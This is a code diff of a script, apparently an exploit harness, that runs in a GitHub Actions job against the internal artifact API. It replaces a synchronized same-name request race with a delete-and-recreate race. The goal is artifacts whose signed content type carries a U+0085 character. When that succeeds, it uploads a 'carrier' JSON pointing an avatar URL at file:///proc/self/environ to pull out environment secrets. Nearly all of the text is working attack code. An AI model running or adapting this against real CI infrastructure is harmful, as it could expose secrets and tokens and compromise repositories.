@@ -5,155 +5,152 @@ import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/inte
 import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
 
 const ids = getBackendIdsFromToken();
-const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
-const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
 const client = internalArtifactTwirpClient({maxAttempts: 1});
 const odd = '\u0085application/json';
-const placeholder = Buffer.from('{"probe":"synchronized-race"}');
-const placeholderHash = createHash('sha256').update(placeholder).digest('hex');
+const placeholder = Buffer.from('{"probe":"delete-recreate"}');
+const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-function createBody(name, version, mimeType) {
-  return Buffer.from(JSON.stringify({
-    workflow_run_backend_id: ids.workflowRunBackendId,
-    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
-    name,
-    version,
-    mime_type: mimeType,
-  }));
+async function create(name, version) {
+  try {
+    const value = await client.CreateArtifact({
+      workflowRunBackendId: ids.workflowRunBackendId,
+      workflowJobRunBackendId: ids.workflowJobRunBackendId,
+      name,
+      version,
+      mimeType: StringValue.create({value: version === 7 ? 'application/json' : odd}),
+    });
+    return {ok: true, url: value.signedUploadUrl};
+  } catch (error) {
+    return {ok: false, error: String(error).slice(0, 160)};
+  }
 }
 
-function gatedCreate(name, version, mimeType, gate) {
-  const bytes = createBody(name, version, mimeType);
-  const stream = new ReadableStream({
-    start(controller) {
-      controller.enqueue(bytes.subarray(0, -1));
-      gate.then(() => {
-        controller.enqueue(bytes.subarray(-1));
-        controller.close();
-      });
-    },
-  });
-  return fetch(endpoint, {
-    method: 'POST',
-    headers: {
-      authorization: `Bearer ${runtimeToken}`,
-      'content-type': 'application/json',
-    },
-    body: stream,
-    duplex: 'half',
-  }).then(async response => {
-    const text = await response.text();
-    let data = {};
-    try { data = JSON.parse(text); } catch {}
-    return {
-      status: response.status,
-      url: data.signed_upload_url || data.signedUploadUrl || '',
-      message: String(data.msg || text).slice(0, 120),
-    };
-  });
-}
-
-async function upload(url, bytes) {
+async function upload(url, bytes = placeholder) {
+  if (!url) return false;
   await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
     blobHTTPHeaders: {blobContentType: odd},
   });
+  return true;
 }
 
 async function finalize(name) {
-  const value = await client.FinalizeArtifact({
-    workflowRunBackendId: ids.workflowRunBackendId,
-    workflowJobRunBackendId: ids.workflowJobRunBackendId,
-    name,
-    size: String(placeholder.length),
-    hash: StringValue.create({value: `sha256:${placeholderHash}`}),
-  });
-  return String(value.artifactId);
-}
-
-async function signedType(name) {
-  const value = await client.GetSignedArtifactURL({
-    workflowRunBackendId: ids.workflowRunBackendId,
-    workflowJobRunBackendId: ids.workflowJobRunBackendId,
-    name,
-  });
-  const url = new URL(value.signedUrl);
-  return {rsct: url.searchParams.get('rsct'), url};
-}
-
-function carrier(artifactId) {
-  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
-  return {
-    repository,
-    bytes: Buffer.from(JSON.stringify({
-      full_name: repository,
-      owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-      description: 'Repo Cassette synchronized carrier',
-      stargazers_count: 0,
-    })),
-  };
-}
-
-const total = 240;
-const groupSize = 5;
-const counts = {json: 0, zip: 0, odd: 0, failed: 0};
-const winners = [];
-
-for (let offset = 0; offset < total; offset += groupSize) {
-  let release;
-  const gate = new Promise(resolve => { release = resolve; });
-  const trials = [];
-  for (let i = offset; i < Math.min(total, offset + groupSize); i++) {
-    const name = `sync-${process.env.GITHUB_RUN_ID}-${i}`;
-    const specs = i % 2
-      ? [[7, 'application/json'], [6, odd]]
-      : [[6, odd], [7, 'application/json']];
-    trials.push({
-      i, name,
-      promises: specs.map(([version, mime]) => gatedCreate(name, version, mime, gate)),
+  try {
+    const value = await client.FinalizeArtifact({
+      workflowRunBackendId: ids.workflowRunBackendId,
+      workflowJobRunBackendId: ids.workflowJobRunBackendId,
+      name, size: String(placeholder.length),
+      hash: StringValue.create({value: hash}),
     });
+    return {ok: true, id: String(value.artifactId)};
+  } catch (error) {
+    return {ok: false, error: String(error).slice(0, 160)};
   }
-
-  // Let each request send all but the last JSON byte, then complete the group
-  // together so the handlers contend on the same-name uniqueness boundary.
-  await sleep(250);
-  release();
-  const createdRows = await Promise.all(trials.map(async trial => ({
-    ...trial,
-    created: await Promise.all(trial.promises),
-  })));
-
-  await Promise.all(createdRows.flatMap(row =>
-    row.created.filter(item => item.url).map(item =>
-      upload(item.url, placeholder).catch(() => {}))));
-
-  await Promise.all(createdRows.map(async row => {
-    try {
-      const finals = await Promise.allSettled([finalize(row.name), finalize(row.name)]);
-      const idsFound = [...new Set(finals.filter(x => x.status === 'fulfilled').map(x => x.value))];
-      if (!idsFound.length) throw new Error('no finalized id');
-      const {rsct} = await signedType(row.name);
-      if (rsct === 'application/json') counts.json++;
-      else if (rsct === 'application/zip') counts.zip++;
-      else if (rsct?.includes('\u0085')) counts.odd++;
-      else counts.failed++;
-
-      if (rsct?.includes('\u0085')) {
-        for (const artifactId of idsFound) {
-          const item = carrier(artifactId);
-          await Promise.all(row.created.filter(x => x.url).map(x => upload(x.url, item.bytes)));
-          const winner = {index: row.i, name: row.name, artifactId, rsct, repository: item.repository};
-          winners.push(winner);
-          console.log(`WINNER ${JSON.stringify(winner)}`);
-        }
-      }
-    } catch (error) {
-      counts.failed++;
-      console.log(`RACE_ERROR ${JSON.stringify({index: row.i, error: String(error).slice(0, 180)})}`);
-    }
-  }));
-
-  console.log(`PROGRESS ${JSON.stringify({done: Math.min(total, offset + groupSize), counts, winners: winners.length})}`);
 }
 
-console.log(`RACE_SUMMARY ${JSON.stringify({total, counts, winners})}`);
+async function del(name) {
+  try {
+    const value = await client.DeleteArtifact({
+      workflowRunBackendId: ids.workflowRunBackendId,
+      workflowJobRunBackendId: ids.workflowJobRunBackendId,
+      name,
+    });
+    return {ok: Boolean(value.ok)};
+  } catch (error) {
+    return {ok: false, error: String(error).slice(0, 160)};
+  }
+}
+
+async function inspect(name) {
+  try {
+    const value = await client.GetSignedArtifactURL({
+      workflowRunBackendId: ids.workflowRunBackendId,
+      workflowJobRunBackendId: ids.workflowJobRunBackendId,
+      name,
+    });
+    return {ok: true, rsct: new URL(value.signedUrl).searchParams.get('rsct')};
+  } catch (error) {
+    return {ok: false, error: String(error).slice(0, 160)};
+  }
+}
+
+async function putCarrier(urls, id) {
+  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
+  const bytes = Buffer.from(JSON.stringify({
+    full_name: repository,
+    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
+    description: 'Repo Cassette delete/recreate carrier',
+    stargazers_count: 0,
+  }));
+  await Promise.all(urls.filter(Boolean).map(url => upload(url, bytes).catch(() => false)));
+  return repository;
+}
+
+async function pendingTrial(index, firstVersion) {
+  const name = `pending-${process.env.GITHUB_RUN_ID}-${firstVersion}-${index}`;
+  const first = await create(name, firstVersion);
+  await upload(first.url);
+  const deleted = await del(name);
+  const second = await create(name, firstVersion === 7 ? 6 : 7);
+  await upload(second.url);
+  const final = await finalize(name);
+  const view = await inspect(name);
+  const row = {kind: 'pending', index, firstVersion, first, deleted, second, final, view};
+  if (view.rsct?.includes('\u0085') && final.id) {
+    row.repository = await putCarrier([first.url, second.url], final.id);
+    console.log(`WINNER ${JSON.stringify(row)}`);
+  }
+  return row;
+}
+
+async function finalizedTrial(index, firstVersion, delay) {
+  const name = `finalized-${process.env.GITHUB_RUN_ID}-${firstVersion}-${delay + 30}-${index}`;
+  const first = await create(name, firstVersion);
+  await upload(first.url);
+  const oldFinal = await finalize(name);
+  let deletePromise;
+  let createPromise;
+  if (delay < 0) {
+    deletePromise = del(name);
+    await sleep(-delay);
+    createPromise = create(name, firstVersion === 7 ? 6 : 7);
+  } else {
+    createPromise = create(name, firstVersion === 7 ? 6 : 7);
+    await sleep(delay);
+    deletePromise = del(name);
+  }
+  const [deleted, second] = await Promise.all([deletePromise, createPromise]);
+  await upload(second.url);
+  const final = await finalize(name);
+  const view = await inspect(name);
+  const row = {kind: 'finalized', index, firstVersion, delay, first, oldFinal, deleted, second, final, view};
+  if (view.rsct?.includes('\u0085') && (final.id || oldFinal.id)) {
+    const id = final.id || oldFinal.id;
+    row.repository = await putCarrier([first.url, second.url], id);
+    console.log(`WINNER ${JSON.stringify(row)}`);
+  }
+  return row;
+}
+
+const trials = [];
+for (let i = 0; i < 8; i++) {
+  trials.push(() => pendingTrial(i, i % 2 ? 7 : 6));
+  for (const delay of [-20, 0, 20]) {
+    trials.push(() => finalizedTrial(i, i % 2 ? 7 : 6, delay));
+  }
+}
+const rows = [];
+for (let i = 0; i < trials.length; i += 8) {
+  rows.push(...await Promise.all(trials.slice(i, i + 8).map(fn => fn())));
+}
+const summary = {
+  total: rows.length,
+  odd: rows.filter(x => x.view?.rsct?.includes('\u0085')).length,
+  json: rows.filter(x => x.view?.rsct === 'application/json').length,
+  zip: rows.filter(x => x.view?.rsct === 'application/zip').length,
+  missing: rows.filter(x => !x.view?.ok).length,
+  pending: rows.filter(x => x.kind === 'pending').map(x => ({
+    firstVersion: x.firstVersion, deleted: x.deleted, second: x.second, final: x.final, view: x.view,
+  })),
+};
+console.log(`DELETE_SUMMARY ${JSON.stringify(summary)}`);
